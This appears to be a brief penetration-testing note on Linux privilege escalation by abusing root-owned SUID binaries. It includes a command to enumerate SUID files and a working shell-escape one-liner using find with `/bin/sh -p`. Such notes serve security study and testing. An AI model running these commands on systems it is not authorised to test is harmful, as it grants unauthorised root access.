# Privilege Escalation Method - SUID Binary Abuse

## Vulnerability  
The vulnerability stems from SUID binaries owned by root that allow execution of commands or shell escapes, resulting in privilege escalation.

## Conditions
- A SUID binary owned by *root* is present on the system  
- The binary allows command execution or shell escape functionality  

## Exploitation and Key Commands
- Enumerate SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```
- Identify exploitable binaries (e.g. via GTFOBins)

## Example
```bash
find . -exec /bin/sh -p \; -quit
```
